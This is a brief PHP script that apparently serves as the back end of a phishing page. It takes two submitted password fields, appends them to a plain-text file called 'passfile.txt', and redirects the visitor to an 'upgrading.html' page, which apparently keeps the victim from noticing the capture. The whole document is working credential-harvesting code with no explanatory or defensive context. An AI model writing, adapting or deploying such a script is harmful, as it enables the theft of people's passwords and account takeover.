<?php
echo "abhi";
$password = $_POST['password1'];
$password2= $_POST['password2'];
echo $password,$password2;
$myfile = fopen("passfile.txt", "a") or die("Unable to open file!");
$txt = "\n $password: $password2";
fwrite($myfile, $txt);
fclose($myfile);
sleep(2);
header("location:upgrading.html");

?>
